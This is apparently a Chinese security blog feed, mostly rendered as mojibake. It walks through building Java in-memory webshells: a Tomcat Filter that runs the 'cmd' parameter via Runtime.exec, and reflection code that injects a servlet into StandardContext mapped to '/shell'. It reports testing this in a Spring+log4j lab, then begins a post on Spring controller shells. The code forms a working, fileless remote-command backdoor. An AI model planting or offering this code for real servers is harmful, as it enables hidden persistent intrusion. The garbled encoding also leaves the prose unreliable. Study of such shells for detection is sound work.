<p>æœ€ådoFilterä¸­å†™å›æ˜¾çš„é€»è¾‘ã€‚è¿™é‡Œä¸å†èµ˜è¿°</p>
<pre><code class="language-java">public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {
		HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse resp = (HttpServletResponse) response;
        String cmd=&quot;whoami&quot;;
        cmd= request.getParameter(&quot;cmd&quot;);
        String res=new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;).next();
        response.getOutputStream().println(res);
        response.flushBuffer();
        chain.doFilter(request, response);
    }
</code></pre>
<h3 id="æ•ˆæœ">æ•ˆæœ</h3>
<figure data-type="image" tabindex="27"><a href="https://imgtu.com/i/TxioH1"><img src="https://s4.ax1x.com/2022/01/06/TxioH1.png" alt="TxioH1.png" loading="lazy"></a></figure>
<h2 id="servlet-å†…å­˜é©¬">servlet å†…å­˜é©¬</h2>
<blockquote>
<p><a href="https://www.baidu.com/s?wd=MVC%E6%A1%86%E6%9E%B6&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao">MVCæ¡†æ¶</a>é‡Œå¤´çš„Cï¼ŒControllerçš„è§’è‰²ï¼Œå½“å®¢æˆ·ä»é¡µé¢ä¼ å…¥å‚æ•°è¯·æ±‚çš„æ—¶å€™ï¼Œå‘é€åˆ°<a href="https://so.csdn.net/so/search?q=Servlet">Servlet</a>ï¼ŒServletæ ¹æ®è¯·æ±‚çš„ä¸åŒï¼Œåˆ†é…ç»™ä¸åŒçš„ä¸šåŠ¡ä»£ç å®Œæˆä¸šåŠ¡æ“ä½œï¼Œæ“ä½œå®Œæˆåï¼ŒServletè¿”å›ä¸€ä¸ªç»“æœåˆ°é¡µé¢ä¸Šé¢å»ã€‚</p>
</blockquote>
<h3 id="servlet-è°ƒç”¨æ ˆ">servlet  è°ƒç”¨æ ˆ</h3>
<p>è¿˜æ˜¯å…ˆå†™ä¸ªservletdemoçœ‹çœ‹åœ¨æºç ä¸­æ€ä¹ˆè¿è¡Œçš„</p>
<pre><code class="language-java">package test;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import java.io.IOException;
import java.io.PrintWriter;

@WebServlet(name = &quot;testServlet&quot;,urlPatterns = {&quot;/my/*&quot;})
public class testServlet implements Servlet{
    private transient ServletConfig servletConfig;
    @Override
    public void init(ServletConfig servletConfig) throws ServletException {
        this.servletConfig = servletConfig;
    }
    @Override
    public ServletConfig getServletConfig() {
        return servletConfig;
    }
    @Override
    public void service(ServletRequest request, ServletResponse response) throws ServletException, IOException {
        String output=&quot;it is a servlet&quot;;
        response.setContentType(&quot;text/html&quot;);
        PrintWriter out = response.getWriter();
        out.println(output);
        out.flush();
        out.close();
    }
    @Override
    public String getServletInfo() {
        return &quot;My Servlet&quot;;
    }
    @Override
    public void destroy() {
    }
}
</code></pre>
<p>åœ¨service()æ–¹æ³•ä¸­æ‰“å…¥æ–­ç‚¹å¾—åˆ°è°ƒç”¨æ ˆ</p>
<pre><code class="language-java">service:24, testServlet (test)
internalDoFilter:232, ApplicationFilterChain (org.apache.catalina.core)
doFilter:167, ApplicationFilterChain (org.apache.catalina.core)
doFilter:52, WsFilter (org.apache.tomcat.websocket.server)
internalDoFilter:194, ApplicationFilterChain (org.apache.catalina.core)
doFilter:167, ApplicationFilterChain (org.apache.catalina.core)
invoke:202, StandardWrapperValve (org.apache.catalina.core)
invoke:97, StandardContextValve (org.apache.catalina.core)
invoke:544, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:143, StandardHostValve (org.apache.catalina.core)
invoke:81, ErrorReportValve (org.apache.catalina.valves)
invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:78, StandardEngineValve (org.apache.catalina.core)
service:364, CoyoteAdapter (org.apache.catalina.connector)
service:624, Http11Processor (org.apache.coyote.http11)
process:65, AbstractProcessorLight (org.apache.coyote)
process:831, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1651, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:748, Thread (java.lang)
</code></pre>
<p>è¿™æ—¶å€™å‘ç°ï¼ŒinternalDoFilterè¿™ä¸ªç©æ„ä¸å°±æ˜¯æˆ‘ä»¬ä¹‹å‰åœ¨å­¦ä¹ Filteræ—¶æ‰€è§åˆ°çš„ä¸œè¥¿å—ã€‚å†ä»”ç»†ä¸€çœ‹ï¼Œè¿™ä¸å°±æ˜¯æˆ‘ä»¬ä¸Šæ–‡æ‰€è¯´çš„ï¼Œå½“è¿‡æ»¤é“¾èµ°å®Œæœ€ç»ˆå°±è¾¾åˆ°servletæ–¹æ³•å—ã€‚ä¸æ­¤åŒæ—¶ï¼Œè¿™é‡Œçš„this.servletå·²ç»æ˜¯testservletè¿™ä¸ªæˆ‘ä»¬è‡ªå·±å†™çš„demoäº†ã€‚</p>
<figure data-type="image" tabindex="28"><a href="https://imgtu.com/i/TxiHN6"><img src="https://s4.ax1x.com/2022/01/06/TxiHN6.png" alt="TxiHN6.png" loading="lazy"></a></figure>
<p>é‚£ä¹ˆè¿™ä¸ªservletæ˜¯æ€ä¹ˆæ¥çš„å‘¢ï¼Œæˆ‘ä»¬ç»§ç»­å¾€ä¸Šè·Ÿå‘ç°åŒä¸€ä¸ªç±»ä¸‹çš„doFilteræ–¹æ³•è°ƒç”¨äº†internalDoFilterè·Ÿservletçš„è®¾ç½®æ²¡æœ‰å…³ç³»ï¼Œå†ç»§ç»­å¾€ä¸Š</p>
<figure data-type="image" tabindex="29"><a href="https://imgtu.com/i/TxizDA"><img src="https://s4.ax1x.com/2022/01/06/TxizDA.png" alt="TxizDA.png" loading="lazy"></a></figure>
<p>ç»§ç»­å¾€ä¸Šå‘ç°è¿˜æ˜¯filteré“¾çš„å‰é¢çš„filterçš„æ–¹æ³•ï¼Œè·Ÿservletçš„è®¾ç½®è¿˜æ˜¯æ²¡å…³ç³»ï¼Œç»§ç»­å¾€ä¸Šèµ°ï¼Œç›´åˆ°StandardWrapperValveçš„invokeæ–¹æ³•ï¼Œè¿™é‡Œè¿˜æ˜¯å¾ˆçœ¼ç†Ÿï¼Œæ˜¯ä¹‹å‰è¯´è¿‡çš„æ„é€ è¿‡æ»¤é“¾çš„æ–¹æ³•ã€‚</p>
<figure data-type="image" tabindex="30"><a href="https://imgtu.com/i/TxFCUP"><img src="https://s4.ax1x.com/2022/01/06/TxFCUP.png" alt="TxFCUP.png" loading="lazy"></a></figure>
<p>æ‰¾åˆ°filterChainçš„æ¥æºå‘ç°ç»‘å®šäº†æˆ‘ä»¬çš„servletçš„è¿›å»</p>
<figure data-type="image" tabindex="31"><a href="https://imgtu.com/i/Tx3A2j"><img src="https://s4.ax1x.com/2022/01/06/Tx3A2j.png" alt="Tx3A2j.png" loading="lazy"></a></figure>
<p>è·Ÿè¿›createFilterchainï¼ŒsetServletè¿™ä¸ªæ–¹æ³•å°±åœ¨åˆšåˆšçš„ApplicationFilterChainç±»ä¸­</p>
<figure data-type="image" tabindex="32"><a href="https://imgtu.com/i/Tx3mq0"><img src="https://s4.ax1x.com/2022/01/06/Tx3mq0.png" alt="Tx3mq0.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="33"><a href="https://imgtu.com/i/Tx3uZV"><img src="https://s4.ax1x.com/2022/01/06/Tx3uZV.png" alt="Tx3uZV.png" loading="lazy"></a></figure>
<p>è¿™å°±æ˜¯åœ¨filteré“¾æœ€åæ‰§è¡Œçš„servletçš„æ¥æºï¼Œé‚£ä¹ˆæˆ‘ä»¬ç»‘å®šè¿›å»çš„servletåˆæ˜¯æ€ä¹ˆè®¾ç½®çš„å‘¢ã€‚å›åˆ°StandardWrapperValveç»§ç»­å¾€ä¸Šè·Ÿè¸ª</p>
<p>å‘ç°servletçš„æ¥æºæ˜¯wrapperã€‚wrapperè¿™ä¸ªç©æ„å„¿ä¹Ÿå¾ˆç†Ÿæ‚‰äº†ï¼Œåœ¨å‰ç½®çŸ¥è¯†ä¸­è®²è¿‡ï¼Œä»–æ˜¯servletçš„å°è£…ï¼Œå¯ä»¥è§†ä¸ºservletã€‚</p>
<figure data-type="image" tabindex="34"><a href="https://imgtu.com/i/Tx33RJ"><img src="https://s4.ax1x.com/2022/01/06/Tx33RJ.png" alt="Tx33RJ.png" loading="lazy"></a></figure>
<p>åŒæ ·ä¹Ÿæ˜¯å‰æ–‡è¯´è¿‡ï¼Œcontextæ˜¯wrapperçš„ä¸Šä¸€çº§ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯å¯ä»¥ç”¨contextæ¥æ§åˆ¶wrapperå‘¢ï¼Œç­”æ¡ˆä¹Ÿæ˜¯å¯ä»¥çš„</p>
<p>å‚è€ƒä¸‹é¢çš„æ–‡ç« </p>
<blockquote>
<p>https://blog.csdn.net/iteye_14395/article/details/82541546</p>
</blockquote>
<p>ç›´æ¥å»æ‰¾standardcontextçš„createWrapperæ–¹æ³•ï¼Œè¿™é‡Œç›´æ¥ç•¥è¿‡å¯»æ‰¾çš„è¿‡ç¨‹ç›´æ¥ç»™ç»“è®ºï¼Œåœ¨å¯åŠ¨tomcatçš„è¿‡ç¨‹ä¸­</p>
<p>åœ¨ <code>org.apache.catalina.startup</code>çš„configureContextæ–¹æ³•çš„Wrapper wrapper = this.context.createWrapper()å¤„æ‰“æ–­ç‚¹å¾—åˆ°å¦‚ä¸‹è°ƒç”¨æ ˆï¼Œæ³¨æ„æ˜¯å¯åŠ¨ä¹‹å‰æ‰“æ–­ç‚¹ï¼Œç„¶åå¯åŠ¨çš„è¿‡ç¨‹ä¸­å¾—åˆ°</p>
<pre><code class="language-java">configureContext:1282, ContextConfig (org.apache.catalina.startup)
webConfig:1115, ContextConfig (org.apache.catalina.startup)
configureStart:779, ContextConfig (org.apache.catalina.startup)
lifecycleEvent:299, ContextConfig (org.apache.catalina.startup)
fireLifecycleEvent:123, LifecycleBase (org.apache.catalina.util)
startInternal:5130, StandardContext (org.apache.catalina.core)
start:183, LifecycleBase (org.apache.catalina.util)
addChildInternal:755, ContainerBase (org.apache.catalina.core)
addChild:729, ContainerBase (org.apache.catalina.core)
addChild:695, StandardHost (org.apache.catalina.core)
..........................................................//çœç•¥
run:748, Thread (java.lang)
</code></pre>
<p>å¯ä»¥åœ¨configureContextçš„ä»£ç ä¸­çœ‹åˆ°å¯åŠ¨è¿‡ç¨‹ä¸­ä»tomcatçš„é…ç½®æ–‡ä»¶web.xmlè¯»å–servletï¼Œé€šè¿‡å¾ªç¯å°†æ¯ä¸ªservletå¡è¿›wrapperä¸­ï¼Œæœ€åå†æŠŠwrapperå¡è¿›this.context,è¿™ä¸ªcontextå°±æ˜¯standardcontext</p>
<pre><code class="language-java">		var35 = webxml.getServlets().values().iterator();
        while(var35.hasNext()) {
            ServletDef servlet = (ServletDef)var35.next();
            Wrapper wrapper = this.context.createWrapper();
            if (servlet.getLoadOnStartup() != null) {
                wrapper.setLoadOnStartup(servlet.getLoadOnStartup());
            }

            if (servlet.getEnabled() != null) {
                wrapper.setEnabled(servlet.getEnabled());
            }

            wrapper.setName(servlet.getServletName());
            Map&lt;String, String&gt; params = servlet.getParameterMap();
            var7 = params.entrySet().iterator();

           .........................................//çœç•¥

            wrapper.setOverridable(servlet.isOverridable());
            this.context.addChildwrapper);
        }
</code></pre>
<p><code>webxml.getServlets().values().iterator();</code>è·å–web.xmlä¸­servletçš„é…ç½®ï¼Œç„¶ååˆ¤æ–­æ˜¯å¦å­˜åœ¨ä¸‹ä¸€ä¸ªservletã€‚</p>
<p>å¯ä»¥çœ‹åˆ°åœ¨964è¡Œthis.context.createWrapper()åˆ›å»ºäº†wrapperï¼Œåç»­å°±æ˜¯å°†é…ç½®æ–‡ä»¶ä¸­çš„servletèµ›è¿›wrapperä¸­</p>
<figure data-type="image" tabindex="35"><a href="https://imgtu.com/i/Tx3Ys1"><img src="https://s4.ax1x.com/2022/01/06/Tx3Ys1.png" alt="Tx3Ys1.png" loading="lazy"></a></figure>
<p>1017è¡Œthis.context.addChild(wrapper);å°†wrapperå¢åŠ è¿›contextä¸­ã€‚å¾ªç¯è¯»å–åè¿™é‡Œå·²ç»æ˜¯æˆ‘ä»¬çš„testservletäº†ã€‚</p>
<figure data-type="image" tabindex="36"><a href="https://imgtu.com/i/Tx3dIO"><img src="https://s4.ax1x.com/2022/01/06/Tx3dIO.png" alt="Tx3dIO.png" loading="lazy"></a></figure>
<p>æŠŠservletçš„é…ç½®å¡è¿›å»åï¼Œä¸‹é¢ä»£ç ä¸­è¿˜é…ç½®äº†ServletMappingsã€‚</p>
<figure data-type="image" tabindex="37"><a href="https://imgtu.com/i/Tx3DRH"><img src="https://s4.ax1x.com/2022/01/06/Tx3DRH.png" alt="Tx3DRH.png" loading="lazy"></a></figure>
<p>è‡³äºmappingæ˜¯ä»€ä¹ˆä¸€çœ‹ä¾¿çŸ¥</p>
<figure data-type="image" tabindex="38"><a href="https://imgtu.com/i/Tx32eP"><img src="https://s4.ax1x.com/2022/01/06/Tx32eP.png" alt="Tx32eP.png" loading="lazy"></a></figure>
<p>æ­¤æ—¶å·²ç»å®Œæˆäº†servletçš„åˆå§‹åŒ–ï¼Œç„¶åå†å›åˆ°åˆšå¼€å§‹çš„demoservletã€‚æ­¤æ—¶å‘èµ·è¯·æ±‚</p>
<pre><code class="language-url">http://localhost:8090/tomcatweb_war_exploded/my/
</code></pre>
<p>åœ¨<code>org.apache.catalina.connector</code>çš„CoyoteAdapterä¸­çš„serviceæ–¹æ³•ä¸­æ‰“ä¸‹æ–­ç‚¹ï¼Œå®ƒçš„ä½œç”¨æ˜¯ä»coyoteçš„requestå’Œresponseå¾—åˆ°connectorçš„requestå’Œresponseå¹¶ä¸”ä½¿ä»–ä»¬ä¹‹é—´äº’ç›¸é“¾æ¥.æ¥ä¸‹æ¥æ˜¯é€šè¿‡<strong>postParseRequest</strong>æ¥è§£æè¯·æ±‚çš„å‚æ•°,<strong>æŸ¥æ‰¾context</strong>ã€‚è¿™é‡Œå°±æ‰¾åˆ°äº†æˆ‘ä»¬çš„wrapperã€‚ç®€å•ç‚¹æ¥è¯´ï¼Œ<strong>è¿™é‡Œé€šè¿‡httpè¯·æ±‚æ‰¾åˆ°äº†æˆ‘ä»¬ä¹‹å‰åˆ†é…çš„wrapper</strong></p>
<blockquote>
<p>PS: è¿™é‡Œä¹Ÿå¯ä»¥çœ‹å‡ºCoyoteAdapterçš„ä½œç”¨æ˜¯è¿æ¥å™¨Connectorå’Œå®¹å™¨Containerçš„æ¡¥æ¢.æ¯•ç«Ÿå®Œæˆäº†ç±»å‹çš„è½¬æ¢åˆ†é…</p>
</blockquote>
<figure data-type="image" tabindex="39"><a href="https://imgtu.com/i/Tx3hFS"><img src="https://s4.ax1x.com/2022/01/06/Tx3hFS.png" alt="Tx3hFS.png" loading="lazy"></a></figure>
<p>ç„¶åä¸€è·¯è·Ÿè¿›å°±æ¥åˆ°äº†æœ€å¼€å§‹çš„åœ°æ–¹ã€‚è‡³æ­¤ï¼Œæ•´ä¸ªservletçš„åˆ›å»ºè®¿é—®è¿‡ç¨‹å·²ç»åˆ†æå®Œæ¯•</p>
<figure data-type="image" tabindex="40"><a href="https://imgtu.com/i/Tx35WQ"><img src="https://s4.ax1x.com/2022/01/06/Tx35WQ.png" alt="Tx35WQ.png" loading="lazy"></a></figure>
<h3 id="åˆ†æ-2">åˆ†æ</h3>
<p>ç»è¿‡è§‚å¯Ÿservletçš„åˆå§‹åŒ–æµç¨‹æˆ‘ä»¬å¯ä»¥å¾—åˆ°standardcontextæ˜¯æ•´ä¸ªæµç¨‹ä¸­çš„é‡ä¸­ä¹‹é‡ï¼Œåªéœ€è¦æˆ‘ä»¬æ„å»ºä¸€ä¸ªwrapperç„¶åä½¿ç”¨ï¼ŒstandardContext.addchild()æ–¹æ³•å³å¯æ’å…¥æˆ‘ä»¬è‡ªå·±çš„servletã€‚</p>
<p>é¦–å…ˆè·å–standardcontext</p>
<pre><code class="language-java">WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
</code></pre>
<p>å®ä¾‹åŒ–æ¶æ„servletæ–¹ä¾¿åé¢ç»‘å®š,åå°„è°ƒç”¨standardcontext.createWrapper()ï¼Œè¿™æ˜¯ä¹‹å‰åœ¨tomcatå¯åŠ¨æ—¶ä½¿ç”¨è¿‡çš„</p>
<pre><code class="language-java">tomcat_servlet greetServlet = new tomcat_servlet();
Method createWrapper = Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredMethod(&quot;createWrapper&quot;);
Wrapper greetWrapper = (Wrapper) createWrapper.invoke(standardContext);
</code></pre>
<p>åå°„è°ƒç”¨å†…ç½®çš„æ–¹æ³•æ“wrapperçš„å±æ€§ï¼Œsetnameè®¾ç½®servletçš„åå­—ã€‚setLoadOnStartupç®€å•æ¥è¯´å°±æ˜¯è®¾ç½®servletçš„å¯åŠ¨çº§åˆ«</p>
<pre><code class="language-java">Method gname = Container.class.getDeclaredMethod(&quot;setName&quot;, String.class);
gname.invoke(greetWrapper,&quot;shell&quot;);
Method gload = Wrapper.class.getDeclaredMethod(&quot;setLoadOnStartup&quot;, int.class);
gload.invoke(greetWrapper,1);
Method gservlet = Wrapper.class.getDeclaredMethod(&quot;setServlet&quot;, Servlet.class);
gservlet.invoke(greetWrapper,greetServlet);
Method gclass = Wrapper.class.getDeclaredMethod(&quot;setServletClass&quot;, String.class);
gclass.invoke(greetWrapper,greetServlet.getClass().getName());
</code></pre>
<p>æœ€ååå°„è°ƒç”¨standardContextçš„addchildæ–¹æ³•,ç»‘å®šmappingä¿¡æ¯</p>
<pre><code class="language-java">Method gchild = StandardContext.class.getDeclaredMethod(&quot;addChild&quot;,Container.class);
gchild.invoke(standardContext,greetWrapper);
Method gmap = StandardContext.class.getDeclaredMethod(&quot;addServletMappingDecoded&quot;,String.class,String.class,boolean.class);
gmap.invoke(standardContext,&quot;/shell&quot;, &quot;shell&quot;,false);
</code></pre>
<p>ç„¶åå°±æ˜¯servletçš„ç¼–å†™ï¼ŒæŒ‰ç…§æ ¼å¼æ¥å°±è¡Œã€‚åœ¨serviceä¸­å†™ä¸‹å›æ˜¾çš„é€»è¾‘å³å¯</p>
<h3 id="æ•ˆæœ-2">æ•ˆæœ</h3>
<p>ä¾æ—§æ˜¯spring+log4jçš„é¶åœºï¼Œæ³¨å…¥æ¶æ„ç±»ä¹‹åå¯ä»¥çœ‹åˆ°èƒ½åœ¨æˆ‘ä»¬çš„æ¶æ„servletæ‰€ç»‘å®šçš„shellè·¯å¾„ä¸‹æ‰§è¡Œå‘½ä»¤</p>
<figure data-type="image" tabindex="41"><a href="https://imgtu.com/i/Tx3TQs"><img src="https://s4.ax1x.com/2022/01/06/Tx3TQs.gif" alt="Tx3TQs.gif" loading="lazy"></a></figure>
<p>å‚è€ƒæ–‡ç« </p>
<blockquote>
<p>https://www.cnblogs.com/nice0e3/p/14622879.html#0x02-%E8%BF%87%E6%BB%A4%E9%93%BE%E5%88%86%E6%9E%90</p>
<p>https://forum.ywhack.com/viewthread.php?tid=115869&amp;highlight=%E5%86%85%E5%AD%98%E9%A9%AC</p>
<p>https://www.cnblogs.com/liliqiang/articles/8006816.html</p>
<p>https://blog.csdn.net/qq_34101364/article/details/120856415</p>
<p>https://github.com/ce-automne/TomcatMemShell</p>
</blockquote>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Spring controller å†…å­˜é©¬]]></title>
        <id>https://ja9er.github.io/post/spring-controller-nei-cun-ma/</id>
        <link href="https://ja9er.github.io/post/spring-controller-nei-cun-ma/">
        </link>
        <updated>2021-12-24T10:08:26.000Z</updated>
        <content type="html"><![CDATA[<h1 id="spring-controller-å†…å­˜é©¬å­¦ä¹ ">Spring controller å†…å­˜é©¬å­¦ä¹ </h1>
<blockquote>
<p><em>PS èœé¸Ÿå­¦ä¹ ï¼Œæœ‰ä¸æ­£ç¡®ä¹‹å¤„è¿˜æœ›æ–§æ­£</em></p>
</blockquote>
<h2 id="0x01-å¼€å§‹ä¹‹å‰">0X01 å¼€å§‹ä¹‹å‰</h2>
<p>éœ€è¦æˆ‘ä»¬äº†è§£ä»€ä¹ˆæ˜¯å†…å­˜é©¬ï¼Ÿ</p>
<p>åœ¨æ–°æ‰‹é˜¶æ®µæˆ‘ä»¬ç®€å•çš„å°†å…¶å®šä¹‰ä¸º</p>
<blockquote>
<p>è®¿é—®ä»»æ„urlæˆ–è€…æŒ‡å®šurlï¼Œå¸¦ä¸Šå‘½ä»¤æ‰§è¡Œå‚æ•°ï¼Œå³å¯è®©æœåŠ¡å™¨è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœ</p>
</blockquote>
<p>æ€è€ƒä¸€ä¸‹åœ¨è¿™å…¶ä¸­çš„æ‰€éœ€è¦å®ç°çš„åŠŸèƒ½ï¼Œç°åœ¨æ¥çœ‹å°±æ˜¯ä¸¤ä¸ªéœ€æ±‚</p>
<blockquote>
<ol>
<li>éœ€è¦ä¸€ä¸ªå—æ§çš„url</li>
<li>å—æ§çš„urlæ¥å—ä¼ å‚æ•°ï¼Œä¸”è¿”å›å“åº”çš„ç»“æœ</li>
</ol>
</blockquote>
<p>åœ¨è§£å†³è¿™äº›éœ€æ±‚ä¹‹å‰ï¼Œå…ˆäº†è§£ä¸€ä¸‹MVCç»“æ„</p>
<figure data-type="image" tabindex="1"><a href="https://imgtu.com/i/TYIEVg"><img src="https://s4.ax1x.com/2021/12/24/TYIEVg.png" alt="TYIEVg.png" loading="lazy"></a></figure>
<p>é€šä¿—çš„æ¥è¯´ï¼ŒControllerå°±æ˜¯èƒ¶æ°´å±‚ï¼Œè´Ÿè´£æ¥æ”¶è¯·æ±‚ï¼Œåˆ†é…ç»™å¯¹åº”çš„é€»è¾‘å±‚å¤„ç†ç»“æœï¼Œå¾—å‡ºç»“æœä¹‹åå“åº”ç»™æ¸²æŸ“å±‚</p>
<p>æ‰“å¼€é¶åœºçš„æºç å¯ä»¥çœ‹åˆ°UserControllerè¿™ä¸ªç±»ï¼Œä¸éš¾çœ‹å‡ºï¼Œè¿™é‡Œæ³¨å†Œè·¯ç”±ï¼Œç„¶ååˆ†é…ç»™è·¯ç”±å¯¹åº”çš„æ‰§è¡Œæ–¹æ³•ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„Controller</p>
<pre><code class="language-java">@RestController
@RequestMapping(&quot;/user&quot;)
public class UserController {
    @Autowired
    private UserService userService;
    /**
     * æ³¨å†Œ
     * @param user å‚æ•°å°è£…
     * @return Result
     */
    @PostMapping(value = &quot;/regist&quot;)
    public Result regist(User user){
        return userService.regist(user);
    }
    /**
     * ç™»å½•
     * @param user å‚æ•°å°è£…
     * @return Result
     */
    @PostMapping(value = &quot;/login&quot;)
    public Result login(User user){
        return userService.login(user);
    }
}
</code></pre>
<p>æ‰€ä»¥å¯¹åº”çš„ä¸¤ä¸ªéœ€æ±‚ï¼Œéƒ½å¯ä»¥åœ¨Controllerä¸­è§£å†³ã€‚è¿™ä¹Ÿæ˜¯è¢«ç§°ä¸ºSpring  Controller å†…å­˜é©¬çš„åŸå› </p>
<p>é¢å¯¹éœ€æ±‚æˆ‘ä»¬éœ€è¦åšåˆ°ä»¥ä¸‹ä¸‰ç‚¹ã€‚</p>
<blockquote>
<ol>
<li>åœ¨ä¸ä½¿ç”¨æ³¨è§£å’Œä¿®æ”¹é…ç½®æ–‡ä»¶çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨çº¯ java ä»£ç æ¥è·å¾—å½“å‰ä»£ç è¿è¡Œæ—¶çš„ä¸Šä¸‹æ–‡ç¯å¢ƒï¼›</li>
<li>åœ¨ä¸ä½¿ç”¨æ³¨è§£å’Œä¿®æ”¹é…ç½®æ–‡ä»¶çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨çº¯ java ä»£ç åœ¨ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­æ‰‹åŠ¨æ³¨å†Œä¸€ä¸ª controllerï¼›</li>
<li>controller ä¸­å†™å…¥ Webshell é€»è¾‘ï¼Œè¾¾åˆ°å’Œ Webshell çš„ URL è¿›è¡Œäº¤äº’å›æ˜¾çš„æ•ˆæœï¼›</li>
</ol>
</blockquote>
<h2 id="0x02-è°ƒè¯•">0x02 è°ƒè¯•</h2>
<p>æŒ‰ç…§ç¯å¢ƒæ­å»ºé¶åœº</p>
<p>é…ç½®ä¸€ä¸ªspringboot+log4j+mybitsé¶åœº</p>
<p>https://github.com/Ode1esse/springboot-login-log4j2</p>
<h3 id="0x02-01-æ€ä¹ˆè·å–ä¸Šä¸‹æ–‡">0X02-01 æ€ä¹ˆè·å–ä¸Šä¸‹æ–‡?</h3>
<blockquote>
<p>åœ¨ä¸ä½¿ç”¨æ³¨è§£å’Œä¿®æ”¹é…ç½®æ–‡ä»¶çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨çº¯ java ä»£ç æ¥è·å¾—å½“å‰ä»£ç è¿è¡Œæ—¶çš„ä¸Šä¸‹æ–‡ç¯å¢ƒ</p>
</blockquote>
<p>åœ¨springä¸­æœ‰4ç§æ–¹å¼èƒ½è·å¾—å½“å‰çš„ä¸Šä¸‹æ–‡ç¯å¢ƒ(context)ï¼Œä¸Šä¸‹æ–‡å¯ä»¥ç®€å•ç†è§£ä¸ºwebç«¯å¤„ç†è¿™ä¸ªè¯·æ±‚æ—¶ï¼Œå½“å‰çº¿ç¨‹å†…æ‰€æ‹¥æœ‰çš„å„ç§ç¯å¢ƒä¿¡æ¯å’Œèµ„æºã€‚</p>
<h4 id="æ–¹æ³•ä¸€getcurrentwebapplicationcontext"><strong>æ–¹æ³•ä¸€</strong>ï¼šgetCurrentWebApplicationContext</h4>
<pre><code class="language-java">WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
</code></pre>
<figure data-type="image" tabindex="2"><a href="https://imgtu.com/i/TYIkqS"><img src="https://s4.ax1x.com/2021/12/24/TYIkqS.png" alt="TYIkqS.png" loading="lazy"></a></figure>
<p>åœ¨spring bootä¸­æ— æ³•è·å–</p>
<h4 id="æ–¹æ³•äºŒwebapplicationcontextutils"><strong>æ–¹æ³•äºŒ</strong>ï¼šWebApplicationContextUtils</h4>
<pre><code class="language-java">WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
</code></pre>
<p><strong>æ‹†è§£åˆ†æ</strong></p>
<p><strong>(ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()</strong></p>
<p>åœ¨SpringMVCçš„æºä»£ç ä¸­æä¾›äº†ä¸€ä¸ªå°è£…è¿‡çš„ThreadLocalï¼ŒThreadLocalå°±æ˜¯å½“å‰çº¿ç¨‹çš„æœ¬åœ°å­˜å‚¨å¯¹è±¡ï¼Œåœ¨æ¯ä¸ªçº¿ç¨‹ä¸­éƒ½åˆ›å»ºäº†ä¸€ä¸ª ThreadLocalMap å¯¹è±¡ï¼Œæ¯ä¸ªçº¿ç¨‹å¯ä»¥è®¿é—®è‡ªå·±å†…éƒ¨ ThreadLocalMap å¯¹è±¡å†…çš„ valueã€‚å…¶ä¸­ä¿å­˜äº†æ¯æ¬¡è¯·æ±‚çš„HttpServletRequestå¯¹è±¡</p>
<p>å…¶å®å°±æ˜¯ä¸Šé¢ä»£ç ä¸­çš„<strong>RequestContextHolder</strong></p>
<blockquote>
<p>RequestContextHolderï¼šè¯·æ±‚ä¸Šä¸‹æ–‡æŒæœ‰è€…ï¼Œä»–æ˜¯é€šè¿‡ThreadLocalæ”¾å…¥å½“å‰è¯·æ±‚çº¿ç¨‹ä¸­çš„ï¼Œé€šè¿‡ä»–çš„é™æ€æ–¹æ³•getRequestAttributeså¯ä»¥è·å–åˆ°RequestAttributesï¼Œå¦‚æœæˆ‘ä»¬æ˜¯webé¡¹ç›®ï¼Œé‚£ä¹ˆä»–çš„å­ç±»å°±æ˜¯ServletRequestAttributesã€‚</p>
</blockquote>
<p>ç°åœ¨å°†å…¶ç†è§£ä¸º<font color="orange">RequestContextHolderæ˜¯Springæä¾›çš„å¯ä»¥è·å–HttpServletRequestçš„ä¸€ä¸ªå·¥å…·</font></p>
<figure data-type="image" tabindex="3"><a href="https://imgtu.com/i/TYImPs"><img src="https://s4.ax1x.com/2021/12/24/TYImPs.png" alt="TYImPs.png" loading="lazy"></a></figure>
<p>é€šè¿‡((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()å°±æ‹¿åˆ°å’±ä»¬çš„requestå¯¹è±¡äº†ã€‚</p>
<p><strong>RequestContextUtils.getWebApplicationContext</strong></p>
<p>æ‹¿åˆ°requestå¯¹è±¡åå†æ¥çœ‹çœ‹è¿™ä¸ªå‡½æ•°ï¼Œé¡¾åæ€ä¹‰ï¼Œä¸€çœ‹å°±æ˜¯è·å–Webä¸Šä¸‹æ–‡çš„åœ°æ–¹</p>
<p>çœ‹çœ‹æºç </p>
<figure data-type="image" tabindex="4"><a href="https://imgtu.com/i/TYIu2q"><img src="https://s4.ax1x.com/2021/12/24/TYIu2q.png" alt="TYIu2q.png" loading="lazy"></a></figure>
